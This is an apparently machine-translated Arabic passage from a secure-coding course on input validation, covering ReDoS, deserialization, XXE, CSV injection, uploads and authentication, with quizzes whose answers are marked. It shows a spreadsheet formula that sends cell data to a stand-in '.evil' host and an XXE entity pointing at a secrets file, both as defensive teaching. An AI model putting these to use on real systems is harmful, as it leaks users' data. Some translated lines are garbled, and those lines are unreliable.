3. حيثما أمكن ، حدد الحد الأقصى لطول سلاسل الإدخال وتحقق من طول الإدخال أولا. إذا كان يجب أن تكون المدخلات قصيرة ، فإن النمو الأسي في الوقت سيظل ينتهي به الأمر كمقدار إجمالي صغير من الوقت.

4. قم بتنفيذ مهلة ، على regex (إذا كان مدعوما) أو على التطبيق ككل. على سبيل المثال ،  يدعم [Ruby 3.2](https://www.ruby-lang.org/en/news/2022/04/03/ruby-3-2-0-preview1-released/) قيمة مهلة regex عمومية (`Regexp.timeout`) ومعلمة مهلة عند إنشاء كائن تعبير عادي.  يمكن [لآليات MatchTimeout ل .NET framework](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.matchtimeout) أيضا تعيين قيمة مهلة عمومية أو قيمة واحدة لكل regex.

5. لا تقم بتشغيل regexes التي يوفرها المهاجمون على أنظمة أخرى غير أنظمتهم. لا بأس أن يقدم الخصم regex الذي يديرونه دائما (في هذه الحالة ، يهاجم المهاجمون أنفسهم فقط). ولكن إذا كان بإمكان المهاجمين توفير regexes التي تقوم بتشغيلها ، فقد يتمكنون من التسبب في ReDOS (ما لم تكن قد اتخذت خطوات أخرى لمنعه). Regexes هي ، بشكل عام ، لغات برمجة ، ويجب عليك عموما تجنب تشغيل البرامج التي يوفرها المهاجمون. من الممكن القيام بذلك بشكل آمن نسبيا ، ولكن عليك اتخاذ الكثير من الاحتياطات ودائما ما يكون أكثر أمانا لعدم القيام بذلك.

إذا كنت مهتما بمزيد من التفاصيل ، فراجع [مناقشة OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service&#95;-&#95;ReDoS) حول هذا الموضوع.

ملاحظة: غالبا ما لا يكون ReDoS ** ثغرة أمنية حقيقية. لا يمكن أن تكون هذه التعبيرات ** الثابتة ثغرة أمنية إلا إذا كانت تعمل على نظام موثوق به وتعالج المدخلات غير الموثوق بها. هناك العديد من الأدوات التي يمكنها اكتشاف regexes المعرضة ل ReDoS ولكنها لا تحدد ما إذا كانت مصادر الإدخال غير موثوق بها. يمكن لمثل هذه الأدوات إغراق المطورين بما يسمى "نقاط الضعف" التي ليست نقاط ضعف حقا. بالإضافة إلى ذلك ، في بعض الحالات ، تعمل التدابير المضادة (مثل الحد الأقصى لأحجام المدخلات والمهلات) على القضاء بشكل فعال على فعالية ReDoS. حتى عندما يعالج regex المدخلات غير الموثوق بها وتفشل هذه الإجراءات المضادة ، فإن ReDoS على *الأكثر* سيؤدي إلى رفض الخدمة ، وليس فقدان السرية أو النزاهة. وبالتالي ، في حين أن ReDoS يمكن أن يكون نقطة ضعف حقيقية ، إلا أنه غالبا ما لا يكون ثغرة أمنية أو أقل أهمية. إذا وجدت نفسك تتعامل مع عدد كبير من تقارير الثغرات الأمنية في ReDoS ، فأعد التحقق لمعرفة ما إذا كانت هذه نقاط ضعف حقيقية.
(انظر  [Enosuchblog "نقاط الضعف" والحوافز غير المتوافقة "](https://blog.yossarian.net/2022/12/28/ReDoS-vulnerabilities-and-misaligned-incentives).)

#### اختبار 1.5: مواجهة هجمات ReDoS على التعبيرات العادية

\>\>أي من هذه  الطرق *عملية* للتخفيف من هجمات ReDoS؟ حدد جميع الإجابات التي تنطبق.<<

[!x] استخدم محرك تعبير عادي لا يستخدم التراجع (أي DFA).

[x] حيثما أمكن ، اكتب regexes التي لا تحتوي على هذا السلوك الأسوأ. على سبيل المثال ، كن حذرا بشأن التكرار داخل التكرار.

[x] حدد الحد الأقصى لحجم الإدخال ، بحيث لا يكون السلوك الأسوأ سيئا للغاية.

[ ] لا شيء مما سبق

## التحقق من صحة الإدخال: ما وراء الأرقام والنص

### إلغاء التسلسل غير الآمن

لا تقبل فقط تنسيقات البيانات الأكثر تعقيدا بشكل أعمى. بدلا من ذلك، تأكد من أن قبول هذا الإدخال من مصدر غير موثوق به لن يسبب مشكلة أمنية.

مشكلة خطيرة هي إلغاء التسلسل غير الآمن.  **إلغاء التسلسل** هو عملية تحويل بعض التسلسل (من البايتات أو الأحرف) إلى بعض التنسيقات الداخلية ؛ قد تؤدي هذه العملية إلى إنشاء عدد من الكائنات. يمكن أن يحدث إلغاء التسلسل عند قراءة البيانات من شبكة أو من التخزين ، لأنه في كلتا الحالتين هناك حاجة لتحويل سلسلة من البايتات أو الأحرف إلى تنسيق داخلي. لسوء الحظ ، يمكن أن يؤدي إلغاء التسلسل إلى مشاكل خطيرة ، لأنه إذا كان المصدر غير موثوق به ، فقد يوفر المهاجم تسلسلا تم التلاعب به:

1. قد يتم تحويل البيانات إلى قيمة غير متوقعة يجب ألا تثق بها. على سبيل المثال ، قد تكون قيمة ملف تعريف ارتباط منظم هي التي قالت في الأصل  admin = n **، ولكن قد يغير المهاجم القيمة إلى **admin = y****. إذا قبل البرنامج هذه البيانات بشكل أعمى ، فقد يصبح المهاجم فجأة مسؤولا!

2. قد يؤدي إلغاء تسلسل البيانات إلى تنفيذ التعليمات البرمجية ، على سبيل المثال ، قد يؤدي إلى إنشاء فئات أو مثيلات و / أو استدعاء الأساليب المحددة من قبل المهاجم باستخدام الحجج المقدمة من المهاجم. هذه مشكلة خاصة للتنسيقات المصممة لاستمرار الكائن التعسفي. مثال على ذلك هو تنسيق Python pickle ، الذي يقوم تلقائيا بتنفيذ التعليمات البرمجية في حالات معينة عند إلغاء تسلسل البيانات.

** الحل الأكثر أمانا هو عدم قبول الكائنات المتسلسلة من مصادر غير موثوق بها.**

إذا كان يجب عليك قبول الكائنات المتسلسلة من مصادر غير موثوق بها، يمكنك استخدام تنسيقات التسلسل التي لا تدعم تنفيذ التعليمات البرمجية. على سبيل المثال ، استخدم تنسيقات التسلسل التي تسمح فقط بأنواع البيانات البدائية. هذا يقاوم المشكلة الثانية - تنفيذ التعليمات البرمجية - ولكن في حد ذاته ، فإنه لا يحل المشكلة الأولى - القيم غير المتوقعة. لذلك ، إذا بعد اختيار نهج لمنع تنفيذ التعليمات البرمجية ، تحقق من صحة المدخلات التي تلقيتها باستخدام الأساليب التي ناقشناها بالفعل.

في بعض الحالات، يمكنك منع هجمات إلغاء التسلسل من خلال عمليات التحقق من المصادقة. في الأساس ، حول البيانات غير الموثوق بها إلى بيانات موثوقة! للقيام بذلك، قبل إلغاء تسلسل البيانات، قم بتشغيل التحقق من المصادقة للتأكد من أن البيانات من مصدر موثوق به. تتمثل إحدى الطرق الشائعة للقيام بذلك في التحقق من توقيع رقمي أو رمز مصادقة الرسالة (MAC) أو التشفير المصادق عليه أو إجراء مماثل. هذا النهج شائع بشكل خاص في تطبيقات الويب. في كثير من الأحيان ، سيرسل خادم الويب البيانات إلى العميل ، بحيث يمكن للعميل إرسالها لاحقا (على سبيل المثال ، كملف تعريف ارتباط). هذا النهج جيد طالما أن خادم الويب يتحقق من سلامته (لمنع إنشاء المهاجم أو العبث به) *قبل* إلغاء تسلسله.

يوصي بعض الأشخاص بفرض قيود على نوع السلسلة (على سبيل المثال ، السماح فقط بإلغاء تسلسل فئات معينة). لسوء الحظ ، تم العثور على العديد من الطرق الالتفافية لهذه التقنية على مر السنين. إنها فكرة جيدة كتقنية *تصلب* (أو ببساطة كوسيلة لاكتشاف الأخطاء مبكرا). ومع ذلك ، في العديد من الأنظمة ، ربما يكون هذا خطيرا جدا بحيث لا يمكن التوصية به كدفاع مناسب في حد ذاته.

 يعد إلغاء التسلسل غير الآمن خطأ شائعا في تطبيقات الويب لدرجة أنه 2017 OWASP Top 10 # 8 ، 2021 CWE Top 25 # 13 ، و 2019 CWE Top 25 # 23. إنه [CWE-502 ](https://cwe.mitre.org/data/definitions/502.html)، *إلغاء تسلسل البيانات غير الموثوق بها*. يعتبر أيضا جزءا من 2021 OWASP Top 10 # 8 (A08: 2021) ، *فشل سلامة البرامج والبيانات*. قد يجد المهاجمون صعوبة في استغلال مثل هذه الثغرات الأمنية ، ولكن بمجرد العثور على الثغرة الأمنية ، يمكن أن تؤدي إلى اختراق فوري للنظام بأكمله ، لأنها قد توفر تحكما كاملا في النظام للمهاجم.

#### اختبار 1.6: إلغاء التسلسل غير الآمن

\>\>أحد المخاطر الكبيرة في إلغاء تسلسل البيانات هو أنه ، اعتمادا على تنسيق التسلسل ، قد تتسبب البيانات في تنفيذ التعليمات البرمجية المعرفة من قبل المهاجم. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### هياكل بيانات الإدخال (XML و HTML و CSV و JSON و تحميلات الملفات)

بالطبع ، في بعض الأحيان يحتاج البرنامج إلى قبول هياكل البيانات المعقدة الشائعة ، مثل XML و HTML و JSON و CSV. نظرا لأن هذه تنسيقات شائعة ، يجدر الحديث عنها على وجه التحديد.

في حين أن هذه سلاسل من الناحية الفنية ، إلا أنها في الواقع سلاسل ذات بنية داخلية أكثر تعقيدا. غالبا ما يكون من الأفضل استخدام المكتبات المصممة خصيصا للتعامل مع تنسيقات الإدخال هذه ، طالما أنها مصممة للتعامل مع المدخلات التي يحتمل أن تكون ضارة. يجب أن تحاول عادة تحديد ورفض هياكل البيانات غير الصالحة من الناحية النحوية ، ثم ، عند الاقتضاء ، تحقق من أنها تلبي أي مخطط محدد من المفترض أن تفي به. من الناحية المثالية ، ستتيح لك هذه المكتبات تحديد ما تريد قبوله فقط ، ورفض كل شيء آخر. إذا لم تتمكن هذه الآليات من التحقق من صحة المدخلات بشكل كامل ، فقم باستكمال ذلك بأي تحقق من صحة المدخلات التي تحتاجها لضمان قبول البيانات الصحيحة فقط.

#### .XML

يتم ترميز الكثير من البيانات والرسائل في XML (لغة التوصيف الموسعة). XML هو جزء من تنسيقات أخرى ، مثل SOAP (بروتوكول الوصول إلى الكائنات البسيطة). هناك مصطلحان حول XML يتم الخلط بينهما على نطاق واسع:

* **يتبع**<br>XML جيد التكوين قواعد بناء جملة معينة. على سبيل المثال، يجب إغلاق كل علامات التمييز المفتوحة، ويجب أن تكون عناصر XML متداخلة بشكل صحيح. إذا كنت تقبل  XML ، فتحقق *على الأقل* من أن XML  جيد التكوين ؛ هناك مكتبات متاحة بسهولة لهذا الغرض ، ومن المفترض أن تقبل التطبيقات فقط XML جيدة التكوين.

* **صالح**<br>صالح XML يفي ببعض تعريف المخطط. يحدد المخطط معلومات مثل *العلامات* المسموح بها ، وكيف يمكن تداخلها ، وما إذا كان بعضها مطلوبا. تعريف المخطط ، إذا كان صارما ، هو نوع من القائمة المسموح بها. وبالتالي ، فإن التحقق من الصلاحية قبل قبول إدخال XML يمكن أن يكون مفيدا حقا لمواجهة الهجمات. ومع ذلك ، لا ** تسمح للمهاجم بتحديد المخطط الذي يجب استخدامه - حدد المخطط الذي لا بأس به واستخدمه**. في بعض الأحيان لا يتوفر مخطط ، وإذا كنت تستخرج جزءا صغيرا فقط من XML ، فقد لا يكون من المفيد إنشاء مخطط XML.

إذا كنت تستخدم XML ، فهناك ثغرة أمنية شائعة للغاية تحتاج إلى مواجهتها تسمى كيانات XML الخارجية (XXE). لفهمها ، تحتاج إلى فهم بعض وظائف XML غير المعروفة على نطاق واسع.

يدعم XML المراجع الخارجية التي يمكن تحميلها تلقائيا عند تحميل المستند الأصلي. يمكن أن يكون المرجع الخارجي أي موقع ملف أو عنوان URL. هذا يعني أن المهاجم يمكنه توفير ملفات تتسبب بهدوء في تحميل ملفات أو عناوين URL أخرى ووضعها في أماكن معينة. توجد هذه الوظيفة لسبب ما ، وتعتمد عليها بعض الأنظمة بشكل شرعي. ومع ذلك ، فإن العديد من المطورين ليس لديهم فكرة عن أن هذا ممكن ، وقد أدى ذلك إلى العديد من نقاط الضعف. فيما يلي مثال لمستند XML مع كيانات خارجية مضمنة:

~~~~xml
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
     "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">

    <!DOCTYPE letter [

      <!ENTITY part1 SYSTEM "http://www.example.com/part1.xml">

      <!ENTITY part2 SYSTEM "../../../secrets/part2.xml"> ]> ...

    <building>

    &part1; &part2;

    </building>
~~~~

بشكل عام ، يجب ألا تقبل مراجع خارجية غير محددة من مصادر غير موثوق بها. فيما يلي بعض الحلول الممكنة:

* قم بتكوين قارئ/معالج XML لتجاهل المراجع الخارجية أو رفضها. تأكد من التحقق ، في اختباراتك الآلية ، من أنه لا يزال يتم تجاهله! نظرا لأن معظم التطبيقات لا تستخدم كيانات خارجية ، فعادة ما يكون هذا هو الحل الأسهل.

* منع أو التحقق (مع القائمة المسموح بها) أي مرجع خارجي قبل الاستخدام.

* لا تستخدم XML، بما في ذلك تنسيقات مثل SOAP التي تستخدم XML. لا تحتوي التنسيقات الأخرى ، مثل JSON ، على هذه الآلية وبالتالي لا يمكن أن تواجه هذه المشكلة.

لمزيد من المعلومات حول هذه المشكلة، راجع [صفحة ويب الكيانات الخارجية OWASP XML] (https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html).

 يعد XML XXE خطأ شائعا في تطبيقات الويب لدرجة أنه 2017 OWASP Top 10 # 4 و 2021 CWE Top 25 # 23 و 2019 CWE Top 25 # 17. تم تحديده أيضا على أنه [CWE-611 ](https://cwe.mitre.org/data/definitions/611.html)، *تقييد غير صحيح لمرجع الكيان الخارجي XML*.

#### .HTML

عادة ما يمكنك ببساطة الاتصال بمكتبة للتحقق من صحة HTML وتمرير مجموعة من العلامات المسموح بها (على سبيل المثال ،. ** <p> **) والسمات (على سبيل المثال ، **href =**). كل شيء غير مسموح به يتم إزالته أو رفضه. سيؤدي ذلك إلى القضاء على العلامات الخطيرة مثل**<script>**  من مصادر خارجية (بافتراض أنك لا تدرج علامات خطيرة في مجموعة العلامات المسموح بها).

على الرغم من أن هذا من المحتمل أن يكون موضوعا كبيرا ، إلا أنه من الناحية العملية ، غالبا ما يكون المفتاح هو استخدام مكتبة ذات إعدادات افتراضية آمنة لائقة. إذا سمحت فقط بعلامات مثل **<p> **, **<i> **، و**<b>** ، وقصر السمات على قيم مثل **المعرف** ، فإن مقدار الضرر الذي يمكن أن يحدث محدود إلى حد كبير.

#### .CSV

تنسيق "القيمة المفصولة بفواصل" (CSV) بسيط من الناحية النظرية. كل سطر هو سجل ، حيث يتم فصل الحقول بفواصل. عادة ما يكون السطر الأول "سطر رأس" - أسماء الحقول مفصولة بفواصل (يجب عليك دائما توفير الرأس ، لأن هذا يجعل ملف CSV أكثر قابلية للتوسيع وأسهل بكثير في التعامل مع الأدوات الأخرى).

في الممارسة العملية ، هناك الكثير من الاختلاف في تنسيقات CSV. ومع ذلك ، بالنسبة للأمان ، فإن * المشكلة الأكبر* هي أن بعض الأدوات (مثل Microsoft Excel و LibreOffice) ستنفذ ** بنيات معينة عند قراءة CSV ، حتى لو كان CSV يبدو وكأنه تنسيق بيانات فقط. على سبيل المثال، يتم تفسير قيمة الحقل التي تبدأ ب "**=**" على أنها "*تنفيذ هذه الوظائف*"، ويمكن للوظائف الوصول إلى البيانات الخارجية. في بعض عمليات تنفيذ جداول البيانات، **سترسل محتويات الحقل "=<http://some-server-with-log.evil?v>IMPORTXML(CONCAT(""=""**, CONCATEENATE(A2:E2)), ""//a"")"* * البيانات  من جدول البيانات إلى موقع خارجي. الحل ، كما هو الحال دائما ، هو التحقق من صحة كل قيمة حقل قبل قبولها. القيم الإشكالية بشكل خاص هي تلك التي تبدأ ب **=**  و **+ **و **-** و **@**.

عند قراءة هذه التنسيقات من مصدر غير موثوق به ، تأكد من أن كل خلية تفي بتنسيق البيانات المتوقع ، ولا تنقل البيانات بطريقة أخرى. كن حذرا بشكل خاص من الخلايا التي تبدأ ب "**=**" ، وحاول تجنب تمريرها ، لأن بعض الأدوات قد تنفذ محتوياتها.

#### جسون

لا تمتلك JSON القدرة المضمنة على تسجيل الكيانات أو التعبيرات الخارجية التي تتوقع العديد من الأدوات تنفيذها ، مما يجعلها ميزة من وجهة نظر الأمان. هناك أدوات يمكنها التحقق بسهولة من صحة بناء جملة JSON ، وغالبا ما يتم تنفيذها كجزء من قراءة JSON بتنسيق داخلي مفيد.

إذا كنت ترغب في المضي قدما ، فهناك تنسيقات مثل JSON Schema تتيح لك تحديد تنسيق تنسيق JSON معين بدقة أكبر. ثم يمكنك استخدام مدققي مخطط JSON للتحقق من تطابق البيانات مع المخطط.

#### تحميلات الملفات

في بعض الأحيان تحتاج إلى قبول تحميلات الملفات لأنواع ملفات خاصة (على سبيل المثال ، الصور).

إذا كان برنامجك يسمح بالتحميلات، فحاول قصر التحميلات على أنواع ملفات معينة وتأكد (عبر كل من نوع MIME ومحتوياته) من أنه أحد الأنواع الصالحة التي ستقبلها. حدد ما تسمح به في اسم الملف أيضا ؛ الأحرف الأبجدية الرقمية جيدة بشكل عام ، ولكن أي شيء آخر (خاصة "**/**" و "**&# 92;** ") يمكن أن يكون مشكلة ، لذلك اسمح فقط للأحرف التي أنت متأكد من أنها ستكون على ما يرام. حيثما أمكن، حدد قائمة مقبولة من لاحقات أسماء الملفات المسموح بها، واسمح فقط بتحميلات الملفات المسماة بأحد تلك اللواحق المسموح بها.

 يعد التقييد غير الكافي للتحميلات سببا شائعا للثغرات الأمنية لدرجة أنه 2021 CWE Top 25 # 10 و 2019 CWE Top 25 # 16. تم تحديده على أنه [CWE-434 ](https://cwe.mitre.org/data/definitions/434.html)، *تحميل غير مقيد للملف ذي النوع الخطير*.

#### اختبار 1.7: هياكل بيانات الإدخال (XML ، HTML ، CSV ، JSON ، وتحميلات الملفات)

\>\>عند قراءة البيانات بتنسيقات بيانات شائعة مثل XML وJSON ، يفضل استخدام المكتبات المصممة للتعامل معها بأمان ، وحاول رفض الهياكل غير الصالحة من الناحية النحوية ، ثم حيثما كان ذلك عمليا ، تحقق من أنها تلبي أي مخطط محدد تحتاجه. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### تقليل سطح الهجوم والتعريف والمصادقة والترخيص

في فصل التصميم (في الجزء الأول من هذه الدورة) ، لاحظنا أنه من المهم تقليل *سطح الهجوم* - أي الواجهات التي يمكن للمهاجم الوصول إليها. هذا لا يعني "تقييد الواجهات  التي *تنوي* للمستخدمين استخدامها" ؛ ** يجب أن يحد تطبيقك من الواجهات التي يمكن للمهاجم الوصول إليها. حاول أن تجعل المهاجمين لا يستطيعون حتى * الوصول إلى* معظم الواجهات ، ثم قم بحماية الواجهات التي يمكن الوصول إليها بعناية.

ومع ذلك ، في العديد من الأنظمة ، سيتمكن المهاجمون من محاولة بعض الطلبات. في هذه الحالات ، ستحتاج إلى التأكد من أن الطلب مصرح به (مسموح به) قبل احترامه. تذكر أن التفويض يعني تحديد ما إذا كان هذا الطلب مسموحا به لهذا الشخص أو البرنامج أم لا.

تحتاج إلى *التحقق مما* إذا  كان الطلب مصرحا به أم لا ** في *كل حالة على الإطلاق* إذا لم يكن كذلك. وهذا يعني ، تأكد من أن عمليات التحقق من التفويض غير قابلة للتجاوز. غالبا ما لا تكون الأدوات جيدة في تحديد ما إذا كان كل طلب قد تم فحصه للحصول على إذن ، لذلك تحتاج عادة إلى الاعتماد بشكل أساسي على المراجعة البشرية. إذا تمكن البشر بسهولة من رؤية أن التحقق الصحيح من التفويض قد تم إجراؤه لكل طلب ، فإن المراجعة تستغرق وقتا أقل بكثير *ومن* المرجح أن تكون صحيحة. من الناحية العملية ، غالبا ما يعني ذلك أن البرامج يجب أن تتحقق من التفويض بمجرد أن تتمكن من القيام بذلك بشكل معقول. يعتمد ما يعنيه ذلك بالضبط على نظامك ، على سبيل المثال ، في بنية وحدة تحكم عرض النموذج ، يمكنك وضع فحوصات تفويض على كل إدخال وحدة تحكم و / أو كل إدخال نموذج. ما يهم هو أن تفعل ذلك باستمرار وأنه من السهل على الآخرين التحقق من أنه لا يمكن تجاوزه. وبالمثل ، يجب تخزين البيانات بحيث يمكن أن تنجح الطلبات المصرح بها فقط.

 يعد التفويض غير الكافي خطأ شائعا لدرجة أن *التحكم في الوصول المكسور* هو 2017 OWASP Top 10 #  5 و 2021 OWASP Top 10 # 1. * التفويض غير الصحيح هو 2021 CWE Top 25 # 38 و 2019 CWE Top 25 # 33 (CWE-863*) ، والتفويض [المفقود](https://cwe.mitre.org/data/definitions/863.html) هو 2021 CWE Top 25 #  18 و 2019 CWE Top 25 # 34 (*CWE-862*).[ ](https://cwe.mitre.org/data/definitions/862.html)

بالطبع ، إذا كان هناك شيء يتطلب إذنا ، فهذا يعني أنه يجب أن يكون هناك أولا نوع من التعريف والمصادقة (I& أ) للتأكد من أن الطلب هو من ادعوا أنه. تحقق بدقة من كيفية تعاملك مع المصادقة ، وحيثما كان ذلك عمليا ، استخدم خدمات أو مكتبات أو أطر عمل محترمة للقيام بذلك.

يجب عليك أولا إجراء التحقق من صحة الإدخال للهوية (مثل اسم المستخدم أو عنوان البريد الإلكتروني) ، قبل القيام بأي شيء آخر بها ، لتقليل احتمالية قيام المهاجم بتخريب نظام من خلال نظام تسجيل الدخول الخاص به. في معظم الحالات ، يجب عليك فقط الإبلاغ عن "فشل تسجيل الدخول" (أو ما شابه) إذا فشل الجمع بين الهوية والمصادقة (مثل كلمة المرور) ؛ لا تكشف عما إذا كانت الهوية موجودة في النظام ، لأن ذلك يتيح للمهاجم معرفة ما إذا كانت الهوية موجودة على النظام. يجب أن تدعم عمليات تسجيل الدخول إلى المصادقة متعددة العوامل (MFA) ، إما مباشرة أو عبر خدمة ، نظرا لأنها تميل إلى أن تكون أقوى من كلمات المرور.

إذا كنت تدعم كلمات المرور للمصادقة، فاتبع الممارسات الجيدة، على سبيل المثال:

1. تأكد من عدم عرض أكثر من 1 حرف من كلمة المرور للمستخدم في وقت واحد ، لتقليل مخاطر تمكن شخص آخر من رؤية كلمة المرور (ويعرف أيضا باسم "تصفح الكتف"). يمكنك القيام بذلك في حقول إدخال HTML باستخدام نوع الإدخال `password`.
2. تأكد من أن المستخدمين يمكنهم استخدام برامج إدارة كلمات المرور عند تسجيل الدخول أو إنشاء كلمة مرور أو تغيير كلمة مرور. على سبيل المثال ، تأكد من أن المستخدمين يمكنهم نسخ النص إلى حقول كلمة المرور ، لأن هذه الوظيفة ضرورية لبعض مديري كلمات المرور. إن إجبار المستخدمين على كتابة كلمات المرور يدويا يشجعهم على استخدام كلمات مرور رديئة ويثنيهم عن استخدام مدير كلمات المرور (والذي يعتبره الكثيرون من أفضل الممارسات).
3. عند إنشاء كلمة مرور أو تغييرها، اطلب من المستخدم إدخال كلمة المرور القديمة. هذا يمنع المهاجم من تغيير كلمة المرور بسهولة إذا كان لديه سيطرة قصيرة على الحساب. أيضا ، اطلب من المستخدم إدخال كلمة مرور جديدة مرتين والتحقق من أنها متطابقة ، للتأكد من استخدام كلمة المرور المقصودة ككلمة مرور. يتحقق هذا أيضا من أن مدير كلمات المرور (إن وجد) يرسل كلمة المرور باستمرار.

عندما يغير المستخدم كلمة مرور أو بيانات اعتماد أخرى (مثل رموز MFA المميزة)، فكر في إعلام المستخدم (مثل إرسال بريد إلكتروني أو رسالة نصية). بهذه الطريقة ، إذا لم يتسبب المستخدم في التغيير ، تنبيه المستخدم على الفور.

 2021 OWASP Top 10 # 7 هو *فشل تحديد الهوية والمصادقة*. تعد المصادقة غير الكافية خطأ شائعا لدرجة أن *المصادقة المكسورة* هي 2017 OWASP Top 10 # 2 ، و 2021 CWE Top 25 # 14 ، و 2019 CWE Top 25 # 13. إنه [CWE-287 ](https://cwe.mitre.org/data/definitions/287.html)، *مصادقة غير صحيحة*. * المصادقة المفقودة ل (على وجه التحديد أ) الوظيفة الحرجة* هي 2021 CWE Top 25 #  11 و 2019 CWE Top 25 # 36 (CWE-306[](https://cwe.mitre.org/data/definitions/306.html)).

سنناقش لاحقا أدوات مختلفة للتحقق. على الرغم من أن الأدوات يمكن أن تساعد في العثور على بعض المشكلات ، إلا أنها غالبا ما تكون *أقل* فعالية في العثور على مشكلات المصادقة والتخويل ، لأن الأدوات لا تحتوي عادة على معلومات كافية لتحديد *ما هو مقبول * وما *هو غير* مقبول. من المفيد إجراء اختبارات تتحقق من رفض الطلبات غير المصرح بها ، بالطبع. لكن النهج الأكثر فعالية هو ضمان مصادقة كل مسار إدخال بسرعة واعتماده عند الاقتضاء ، بحيث يمكن للمراجعة اليدوية أن تضمن بسهولة للمراجعين أن جميع الحالات مشمولة.

>  وقت القصة: خرق الهدف

> في عام 2013 تم اختراق شبكة شركة الهدف. في هذا الحادث سرق 40 مليون رقم بطاقة ائتمان وخصم و 70 مليون سجل للمعلومات الشخصية. من الصعب تقدير التكاليف الكاملة ، لكن نقابات بطاقات الائتمان أنفقت أكثر من 200 مليون دولار فقط لإعادة إصدار البطاقات. تشير أفضل الأدلة المتاحة إلى أن الخرق الأولي حدث في شركة تدفئة وتهوية وتكييف هواء (HVAC) تابعة لجهة خارجية. استخدم المهاجمون بيانات الاعتماد المخترقة هذه لاختراق الشبكة المستهدفة. تمكن المهاجمون من تخريب الأنظمة الحساسة بسبب ضعف التجزئة بين الشبكات غير الحساسة والحساسة داخل الهدف ([*كسر الهدف: تحليل خرق البيانات المستهدفة والدروس المستفادة ، *](https://arxiv.org/pdf/1701.04940.pdf)بقلم Xiaokui Shu و Andrew Ciambrone و Danfeng Yao ، 2017).

#### الاختبار 1.8: تقليل سطح الهجوم وتحديد الهوية والمصادقة والتفويض

\>\>من المهم أن يكون البشر قادرين على التحقق مباشرة من أن المصادقة غير قابلة للتجاوز. صواب أم خطأ؟<<

(x) صحيح

( ) خطأ

### مسارات البحث ومتغيرات البيئة (بما في ذلك برامج setuid / setgid)

غالبا ما تحتاج التطبيقات إلى البحث عن موارد أخرى، مثل المكتبات والأوامر والحزم. في كثير من الحالات ، يتم التحكم في هذا البحث بواسطة "مسار بحث" - موقع أو تسلسل من المواقع للبحث. أحد الأمثلة على مسار البحث هو `PATH` متغير البيئة ، الذي يسرد سلسلة من الدلائل ويستخدم عند البحث عن الملفات التنفيذية على أنظمة تشبه Unix وأنظمة Windows. توجد العديد من `PATH`متغيرات البيئة الأخرى المشابهة (على سبيل المثال ، `PYTHONPATH` في Python). بالإضافة إلى ذلك ، تحتوي العديد من الأنظمة الأخرى على مسارات بحث ، على سبيل المثال ، يدعم مديرو الحزم عادة مسار بحث يشير إلى المستودعات أو السجلات التي يمكن استرداد الحزم منها.

إذا تمكن المهاجم من التحكم في مسار البحث، فيمكن للمهاجم غالبا أن يتسبب في تشغيل التطبيق لتعليمات برمجية ضارة أو استخدام البيانات التي يتحكم فيها المهاجم أو الكشف عن بيانات خاصة. على سبيل المثال، إذا تمكن مهاجم من التحكم في `PATH` متغير البيئة، فقد يتمكن مهاجم من فرض التطبيق على تشغيل برامج غير مقصودة. أفضل حل هو التأكد من أن المهاجم لا يمكنه التحكم في مسار البحث ، على سبيل المثال ، من خلال عدم توفير الفرصة أو عن طريق تعيين مسار البحث إلى قيمة آمنة قبل استخدامه.

المشكلة ذات الصلة هي أن مسار البحث قد يحتوي على موقع يمكن للمهاجم التحكم فيه أو التأثير عليه بطريقة غير متوقعة. على سبيل المثال ، إذا `PATH` كان متغير البيئة يحتوي على إدخال تم تعيينه إلى الدليل الحالي ، أي "." أو "" (فارغ) ، وتم سرد الإدخال قبل أدلة أكثر جدارة بالثقة ، استخدام الدليل الحالي أولا. يمكن أن تصبح هذه ثغرة أمنية لأن المهاجم قد يكون قادرا في النهاية على إدراج محتويات في دليل سيستخدمه التطبيق كدليل حالي. في الأنظمة القديمة الشبيهة ب Unix ، كان إعداد PATH غير الآمن هو الإعداد الافتراضي. إحدى الطرق الشائعة التي يحدث بها هذا الخطأ اليوم هي إذا تم تعديل المسار عن طريق تسلسل فاصل الدليل ثم الدليل الجديد ؛ إذا كان المسار فارغا للبدء ، فإن القيام بذلك يضيف إدخالا فارغا كإدخال أول. على سبيل المثال ، إذا `PYTHONPATH` كان فارغا ، فإن التسلسل الساذج  ":" والدليل `/usr/share/foo` سينتج  "`PYTHONPATH`:/usr/share/foo<tt>"</tt> ؛ لاحظ أنه يتم سرد الدليل الفارغ أولا ، والذي سيتم تفسيره على أنه البحث أولا في الدليل الحالي. الحل في هذه الحالة هو إدخال الفاصل فقط إذا كان هناك نص بالفعل.

هناك العديد من الإجراءات المضادة المحتملة لمشاكل مسار البحث ، على سبيل المثال:

* عند بدء التشغيل ، افحص مسار البحث الذي ستستخدمه `PATH` (مثل ) بحثا عن الأخطاء الشائعة مثل تضمين دليل فارغ أو "." قبل المسارات الأكثر موثوقية (مثل `/usr/bin`). في أنظمة Windows ، تحقق مما إذا كان وضع بحث DLL الآمن ممكنا. قد تتوقف ، أو على الأقل تحذر ، إذا كانت إعدادات النظام الحالية خطيرة.
* استخدم أسماء المسارات الكاملة عند تقديم طلب (على سبيل المثال ، استدعاء البرامج القابلة للتنفيذ أو استيراد المكتبات أو طلب الحزم). معظم الأنظمة التي تدعم مسار البحث تدعم أيضا طلب المكون المحدد مباشرة ؛ سيضمن تقديم طلب مباشر أنك تطلب الطلبات الصحيحة. هذه آلية تصلب معقولة ، ولكن من السهل نسيان القيام بذلك في بعض الحالات ، وهذا يجعل من الصعب أحيانا نقل البرامج بين الأنظمة.

يتم توفير العديد من قيم التكوين، بما في ذلك العديد من مسارات البحث، عبر متغيرات البيئة. لا تحتوي بعض بيئات التنفيذ، مثل JavaScript من جانب العميل، على متغيرات بيئة. في معظم البيئات الأخرى (العميل والخادم) ، توجد متغيرات البيئة ، ولكنها تعتبر عادة موثوقة (أي أنه لا يمكن تعيين متغيرات البيئة إلا بواسطة شخص لديه تفويض لتعيينها). ومع ذلك ، هناك بعض الحالات الخاصة التي يجب أن تكون فيها ثقتهم محدودة.

